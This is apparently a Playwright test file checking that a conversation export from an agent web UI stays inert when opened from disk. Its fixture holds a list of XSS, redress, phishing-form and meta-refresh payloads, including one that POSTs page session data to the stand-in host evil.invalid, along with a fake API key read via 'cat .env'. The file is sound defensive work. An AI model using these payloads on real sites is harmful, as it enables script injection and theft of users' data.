import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { FIXTURE_BUCKET, FIXTURE_CWD } from "../support/fixtures.ts";
import { expect, test } from "./fixtures.ts";

/**
 * An exported conversation is a file opened from disk, and it holds the whole transcript. `omp --export` leaves raw HTML
 * in the model's Markdown and carries no policy: a reply with `<img onerror>` ran script when the file was opened,
 * `![x](https://…)` fetched, `<meta refresh>` navigated away. The export the web UI hands out must be inert: this opens
 * one of a hostile transcript from disk in a browser that has no cookie, and nothing may run, load or leave.
 */

const ts = (min: number) => new Date(Date.UTC(2026, 0, 12, 10, min)).toISOString();
const usage = {
	input: 1,
	output: 1,
	cacheRead: 0,
	cacheWrite: 0,
	totalTokens: 2,
	cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0, total: 0 },
};
const PIXEL =
	"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
const LEAK = "https://evil.invalid";

/** One reply per way of getting HTML, script, a request or a navigation out of Markdown. */
const HOSTILE: Record<string, string> = {
	img: `<img src=x onerror="window.PWNED_IMG=1">`,
	svg: `<svg onload="window.PWNED_SVG=1"></svg>`,
	srcdoc: `<iframe srcdoc="<script>parent.PWNED_SRCDOC=1</script>"></iframe>`,
	javascriptLink: `<a id="js-link" href="javascript:window.PWNED_JSLINK=1">click me</a>`,
	autofocus: `<input autofocus onfocus="window.PWNED_FOCUS=1">`,
	details: `<details open ontoggle="window.PWNED_TOGGLE=1"><summary>x</summary></details>`,
	markdownLinks: `[js](javascript:window.PWNED_MDJS=1) [data](data:text/html,<script>window.PWNED_MDDATA=1</script>) [file](file:///etc/passwd) [ok](https://example.com/ok)`,
	remoteImages: `![a](${LEAK}/leak.png?d=secret) ![b](//evil.invalid/p.png) ![inline](${PIXEL})`,
	redress: `<style>*{display:none!important}</style><div style="position:fixed;inset:0;background:#fff">FAKE LOGIN</div>`,
	refresh: `<meta http-equiv="refresh" content="0;url=${LEAK}/m">`,
	frame: `<iframe src="${LEAK}/frame"></iframe>`,
	form: `<form action="${LEAK}/login" method="post"><input name="pw"><button>Sign in</button></form>`,
	head: `<link rel="stylesheet" href="${LEAK}/x.css"><base href="${LEAK}/">`,
	script: `<script>window.PWNED_SCRIPT=1</script>`,
	exfil: `<img src=x onerror="fetch('${LEAK}/leak',{method:'POST',body:document.getElementById('session-data').textContent})">`,
};

/** A transcript with every vector in one chain, a secret in a tool result, a compaction and a hostile model name. */
function writeHostileSession(agentDir: string): string {
	const bucket = join(agentDir, "sessions", FIXTURE_BUCKET);
	mkdirSync(bucket, { recursive: true });
	const id = "01a00000-0000-7000-8000-00000000e0e0";
	const file = join(bucket, `2026-01-12T10-00-00-000Z_${id}.jsonl`);
	const reply = (n: number, parentId: string, text: string, model = "claude-haiku-5-5") => ({
		type: "message",
		id: `h${n}`,
		parentId,
		timestamp: ts(n),
		message: {
			role: "assistant",
			content: [{ type: "text", text }],
			api: "anthropic-messages",
			provider: "anthropic",
			model,
			usage,
			stopReason: "stop",
			timestamp: Date.parse(ts(n)),
		},
	});
	const entries: unknown[] = [
		{
			type: "message",
			id: "h1",
			parentId: null,
			timestamp: ts(1),
			message: { role: "user", content: [{ type: "text", text: "read the file" }], attribution: "user", timestamp: 1 },
		},
		{
			type: "message",
			id: "h2",
			parentId: "h1",
			timestamp: ts(2),
			message: {
				role: "assistant",
				content: [{ type: "toolCall", id: "t1", name: "bash", arguments: { command: "cat .env" } }],
				api: "anthropic-messages",
				provider: "anthropic",
				model: "claude-haiku-5-5",
				usage,
				stopReason: "toolUse",
				timestamp: 2,
			},
		},
		{
			type: "message",
			id: "h3",
			parentId: "h2",
			timestamp: ts(3),
			message: {
				role: "toolResult",
				toolCallId: "t1",
				toolName: "bash",
				content: [{ type: "text", text: "API_KEY=sk-SECRET-TOKEN-1234567890" }],
				isError: false,
				timestamp: 3,
			},
		},
	];
	let parent = "h3";
	let n = 10;
	for (const text of Object.values(HOSTILE)) {
		entries.push(reply(n, parent, text));
		parent = `h${n}`;
		n++;
	}
	entries.push(reply(n, parent, "plain reply with a hostile model name", `<img src=x onerror="window.PWNED_MODEL=1">`));
	parent = `h${n}`;
	entries.push({
		type: "compaction",
		id: "hc",
		parentId: parent,
		timestamp: ts(60),
		summary: "the summary",
		firstKeptEntryId: "h3",
		tokensBefore: 10,
	});
	entries.push(reply(n + 1, "hc", "the last reply"));
	const header = { type: "session", version: 3, id, timestamp: ts(0), cwd: FIXTURE_CWD };
	writeFileSync(file, `${[header, ...entries].map((e) => JSON.stringify(e)).join("\n")}\n`);
	return file;
}

test("an exported hostile conversation opened from disk runs nothing, loads nothing and goes nowhere", async ({
	page,
	browser,
}, testInfo) => {
	const file = writeHostileSession(process.env.OMPW_E2E_AGENT_DIR as string);
	await page.goto(`/#/s/${encodeURIComponent(file)}`);
	await expect(page.getByTestId("chat-title")).toBeVisible();

	// The export the UI downloads.
	const [download] = await Promise.all([page.waitForEvent("download"), page.getByTestId("export-html").click()]);
	const saved = testInfo.outputPath("export.html");
	await download.saveAs(saved);

	// Opened as a user does: from disk, in a browser with no cookie, where anything but the file itself is a failure.
	const context = await browser.newContext({ storageState: { cookies: [], origins: [] } });
	const outside: string[] = [];
	await context.route(
		(url) => url.protocol !== "file:",
		(route) => {
			outside.push(route.request().url());
			return route.abort();
		},
	);
	const opened = await context.newPage();
	const errors: string[] = [];
	const navigations: string[] = [];
	opened.on("pageerror", (e) => errors.push(e.message));
	opened.on("dialog", (d) => d.dismiss());
	opened.on("framenavigated", (f) => {
		if (f === opened.mainFrame()) navigations.push(f.url());
	});
	await opened.goto(`file://${saved}`);
	await expect(opened.locator(".assistant-message").first()).toBeVisible();
	// The hostile link is there to be clicked: it must lead nowhere.
	await opened
		.locator("#js-link")
		.click({ timeout: 1000 })
		.catch(() => {});
	await opened.waitForTimeout(1500);

	const state = await opened.evaluate(() => ({
		ran: Object.keys(window).filter((k) => k.startsWith("PWNED")),
		assistant: document.querySelectorAll(".assistant-message").length,
		frames: document.querySelectorAll("iframe, frame, object, embed, form, base, link[rel=stylesheet]").length,
		refresh: document.querySelectorAll('meta[http-equiv="refresh"]').length,
		links: [...document.querySelectorAll("#messages a[href]")].map((a) => a.getAttribute("href") ?? ""),
		images: [...document.querySelectorAll("img:not(#modal-image)")].map((i) =>
			(i.getAttribute("src") ?? "").slice(0, 16),
		),
		handlers: [...document.querySelectorAll("#messages *")].filter((e) =>
			[...e.attributes].some((a) => a.name.startsWith("on")),
		).length,
		fixed: [...document.querySelectorAll("#messages *")].filter((e) => getComputedStyle(e).position === "fixed").length,
		text: document.getElementById("messages")?.textContent ?? "",
	}));

	expect(state.ran).toEqual([]);
	expect(outside).toEqual([]);
	expect(navigations.every((u) => u.startsWith("file://"))).toBe(true);
	expect(errors).toEqual([]);
	expect(state.frames).toBe(0);
	expect(state.refresh).toBe(0);
	expect(state.handlers).toBe(0);
	expect(state.fixed).toBe(0);
	// Only links a person may follow stay links; images are inline ones.
	expect(state.links.every((href) => /^(https?:\/\/|mailto:|#)/.test(href))).toBe(true);
	expect(state.links).toContain("https://example.com/ok");
	expect(state.links.some((href) => /evil|javascript|data:|file:/.test(href))).toBe(false);
	expect(state.images.every((src) => src.startsWith("data:image/"))).toBe(true);
	expect(state.images.length).toBeGreaterThan(0);
	// Raw HTML reads as text, as in the web UI, and the conversation is all there.
	expect(state.text).toContain('<img src=x onerror="window.PWNED_IMG=1">');
	expect(state.text).toContain("the last reply");
	expect(state.assistant).toBeGreaterThan(Object.keys(HOSTILE).length);
	await context.close();
});

test("the export keeps working: cards and compactions open, the tree navigates", async ({
	page,
	browser,
}, testInfo) => {
	const file = writeHostileSession(process.env.OMPW_E2E_AGENT_DIR as string);
	await page.goto(`/#/s/${encodeURIComponent(file)}`);
	await expect(page.getByTestId("chat-title")).toBeVisible();
	const [download] = await Promise.all([page.waitForEvent("download"), page.getByTestId("export-html").click()]);
	const saved = testInfo.outputPath("export-keeps-working.html");
	await download.saveAs(saved);

	const context = await browser.newContext({ storageState: { cookies: [], origins: [] } });
	const opened = await context.newPage();
	await opened.goto(`file://${saved}`);
	const compaction = opened.locator(".compaction").first();
	await expect(compaction).toBeVisible();
	await expect(compaction).not.toHaveClass(/expanded/);
	await compaction.click();
	await expect(compaction).toHaveClass(/expanded/);
	await compaction.click();
	await expect(compaction).not.toHaveClass(/expanded/);

	const card = opened.locator(".tv-head").first();
	await expect(card).toHaveAttribute("aria-expanded", "true");
	await card.click();
	await expect(card).toHaveAttribute("aria-expanded", "false");

	const nodes = opened.locator(".tree-node");
	expect(await nodes.count()).toBeGreaterThan(5);
	await nodes.nth(0).click();
	await expect(opened.locator(".user-message")).toHaveCount(1);
	// A hostile model name is not markup in the header.
	await expect(opened.locator("#header-container")).toContainText("anthropic/");
	await expect(opened.locator("#header-container img")).toHaveCount(0);
	await context.close();
});
